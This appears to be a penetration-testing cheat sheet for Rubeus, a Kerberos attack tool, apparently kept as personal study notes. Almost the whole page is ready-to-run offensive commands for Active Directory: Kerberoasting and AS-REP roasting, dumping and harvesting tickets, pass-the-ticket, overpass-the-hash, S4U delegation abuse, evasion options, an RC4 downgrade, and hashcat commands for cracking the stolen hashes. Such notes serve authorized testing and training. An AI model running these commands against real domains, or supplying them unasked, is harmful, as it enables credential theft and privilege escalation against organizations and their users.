---
title: Rubeus
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - mimikatz
  - kerberos
---
# Rubeus

Rubeus is a C# toolset for raw Kerberos interaction and abuses.

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:

- RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
- AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`

## Installation

Github: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

Some of the utilities:

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

## Basic commands

```
########################################
# Kerberoasting stats (discover roastable accounts without requesting tickets)
########################################

# Gather Kerberoasting statistics
.\Rubeus.exe kerberoast /stats

########################################
# List Kerberos tickets in the current session
########################################

# List all Kerberos tickets
.\Rubeus.exe klist

########################################  
# Dump Kerberos tickets from memory  
########################################  
  
# Dump all tickets  
.\Rubeus.exe dump


#####
# Inject a ticket and use it
#####
# Create a base64(ticket.kirbi):
.\Rubeus.exe tgtdeleg  /nowrap
# In kali, remove line breaks from base64 blob  
echo "<base64 blob>" | tr -d \\n  > encode_file
# Decode base64 ticket into .kirbi file  
cat encoded_file | base64 -d > ticket.kirbi 
# Upload the ticket.kirbi to the target, and use it 
.\Rubeus.exe ptt /ticket:ticket.kirbi
sqlcmd -S DC01.zeus.corp -E

########################################  
# Request a TGT using plaintext credentials  
########################################  
  
# Request a TGT  
.\Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /domain:<DOMAIN>  
  
# Example  
.\Rubeus.exe asktgt /user:john /password:P@ssw0rd123 /domain:corp.local  
  
  
########################################  
# Request a TGT using NTLM hash (Overpass-the-Hash)  
########################################  
  
# Request TGT using NTLM hash  
.\Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN>  
  
# Example  
.\Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local  
  
  
########################################  
# Request TGT using AES key  
########################################  
  
# Request TGT using AES256 key  
.\Rubeus.exe asktgt /user:<USER> /aes256:<AES_KEY> /domain:<DOMAIN>  
  
# Example  
.\Rubeus.exe asktgt /user:administrator /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /domain:corp.local  
  
  
########################################  
# Request a service ticket (TGS)  
########################################  
  
# Request service ticket  
.\Rubeus.exe asktgs /ticket:<TGT_KIRBI> /service:<SPN>  
  
# Example  
.\Rubeus.exe asktgs /ticket:admin.kirbi /service:cifs/fileserver.corp.local  
  
  
########################################  
# S4U constrained delegation attack  
########################################  
  
# Request service ticket on behalf of another user  
.\Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<HASH> /impersonateuser:<TARGET_USER> /msdsspn:<SPN> /domain:<DOMAIN> /ptt  
  
# Example  
.\Rubeus.exe s4u /user:websvc /rc4:8846f7eaee8fb117ad06bdd830b7586c /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /domain:corp.local /ptt  
  
  
########################################  
# Monitor Kerberos tickets in memory  
########################################  
  
# Monitor ticket activity  
.\Rubeus.exe monitor  
  
# Example  
.\Rubeus.exe monitor  
  
  
########################################  
# Capture new TGTs appearing in memory  
########################################  
  
# Monitor for new TGTs  
.\Rubeus.exe harvest  
  
# Example  
.\Rubeus.exe harvest  
  
  
########################################  
# Renew a Kerberos TGT  
########################################  
  
# Renew TGT  
.\Rubeus.exe renew /ticket:<TGT_KIRBI>  
  
# Example  
.\Rubeus.exe renew /ticket:admin.kirbi  
  
  
########################################  
# Convert kirbi ticket to base64  
########################################  
  
# Convert ticket  
.\Rubeus.exe describe /ticket:<TICKET>  
  
# Example  
.\Rubeus.exe describe /ticket:admin.kirbi
```


### Kerberoasting 

```
########################################
# Kerberoasting (request service tickets for cracking)
########################################

# Perform Kerberoasting
.\Rubeus.exe kerberoast /nowrap

# Perform Kerberoasting and save hashes to a file
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Perform Kerberoasting and print hashes in simple console format
.\Rubeus.exe kerberoast /simple /nowrap

# Perform Kerberoasting for a specific user
.\Rubeus.exe kerberoast /user:<USER> /nowrap

# Example
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Perform Kerberoasting using a specific SPN
.\Rubeus.exe kerberoast /spn:<SPN> /nowrap

# Example
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap

# Perform Kerberoasting using SPNs from a file
.\Rubeus.exe kerberoast /spns:C:\temp\spns.txt /nowrap


########################################
# Kerberoasting with alternate credentials
########################################

# Perform Kerberoasting using alternate credentials
.\Rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap

# Example
.\Rubeus.exe kerberoast /creduser:corp.local\john /credpassword:P@ssw0rd123 /nowrap


########################################
# Kerberoasting with an existing TGT
########################################

# Perform Kerberoasting using an existing ticket (base64 or kirbi)
.\Rubeus.exe kerberoast /ticket:<BASE64_OR_KIRBI> /nowrap

# Example
.\Rubeus.exe kerberoast /ticket:admin.kirbi /nowrap


# Perform Kerberoasting using enterprise principal
.\Rubeus.exe kerberoast /spn:user@domain.com /enterprise /ticket:<TICKET> /nowrap

# Example
.\Rubeus.exe kerberoast /spn:sqlsvc@corp.local /enterprise /ticket:admin.kirbi /nowrap


# Perform Kerberoasting and automatically retry using enterprise principal
.\Rubeus.exe kerberoast /ticket:<TICKET> /autoenterprise /nowrap

# Example
.\Rubeus.exe kerberoast /ticket:admin.kirbi /autoenterprise /nowrap


########################################
# Kerberoasting LDAP filtering
########################################

# Request tickets only for accounts with adminCount=1
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Request tickets for accounts whose passwords were set in a date range
.\Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 /nowrap

# Example
.\Rubeus.exe kerberoast /pwdsetafter:01-01-2018 /pwdsetbefore:01-01-2022 /resultlimit:10 /nowrap


########################################
# Kerberoasting OPSEC options
########################################

# Perform Kerberoasting using tgtdeleg ticket (forces RC4 for AES accounts in older DCs)
.\Rubeus.exe kerberoast /usetgtdeleg /nowrap

# Perform OPSEC Kerberoasting filtering out AES-enabled accounts
.\Rubeus.exe kerberoast /rc4opsec /nowrap

# Perform Kerberoasting with delay and jitter
.\Rubeus.exe kerberoast /delay:5000 /jitter:30 /nowrap

# Request AES-encrypted Kerberos service tickets
.\Rubeus.exe kerberoast /aes /nowrap


```

### AS-REP Roasting

```
########################################
# AS-REP Roasting
########################################

# Retrieve AS-REP hash for a specific user
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat

# Example
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat


# Retrieve AS-REP hashes for all roastable users
.\Rubeus.exe asreproast /nowrap /format:hashcat

# Example
.\Rubeus.exe asreproast /nowrap /format:hashcat

```


### Pass-the-Ticket

```
########################################
# Pass-the-Ticket with Rubeus
########################################

# Inject Kerberos ticket into current session
.\Rubeus.exe ptt /ticket:<PATH_TO_KIRBI>

# Example
.\Rubeus.exe ptt /ticket:C:\tools\julio.kirbi


runas /netonly /user:NAGOYA\Administrator powershell
```


### Kerberos ticket cracking

```
########################################
# Kerberos ticket cracking
########################################

# Crack RC4 Kerberos TGS hash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt

# Example
hashcat -m 13100 svc_sql_hash /usr/share/wordlists/rockyou.txt


# Crack AES Kerberos TGS hash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt

# Example
hashcat -m 19700 svc_sql_aes_hash /usr/share/wordlists/rockyou.txt


# Crack AS-REP roast hash
hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt

# Example
hashcat -m 18200 mmorgan_hash /usr/share/wordlists/rockyou.txt


########################################
# Identify encryption type used by SPN accounts
########################################
powershell -ep bypass
Import-Module .\PowerView.ps1
# Check Kerberos encryption type of service account
Get-DomainUser <USER> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Example
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```



#### RC4 versus AES encription

TGS ticket with RC4 (type 23) encryption is easier to crack than AES and if we force the return of RC4 encrypted hashes, the higher will be the chances to get it cracked. 

```
# Checking Kerberos Encryption Type
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Output will be something similar to:
serviceprincipalname                     msds-supportedencryptiontypes samaccountname
--------------------                     ----------------------------- --------------
testspn/kerberoast.inlanefreight.local   0                             testspn

# Value meaning and correct hashcat module:
# 0: RC4_HMAC_MD5 (default) RC4 (etype 23)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# 24: AES128 + AES256 AES256 (etype 18)
hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt
```

Forcing RC4:

```
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```

**Exception**: On **Windows Server 2019 domain controllers**, the /tgtdeleg downgrade technique generally does not work. The domain controller will return the highest encryption type supported by the account, usually AES‑256.

> In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 


With AES (type 18) encryption, this would be the hashcat module:

```shell-session
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
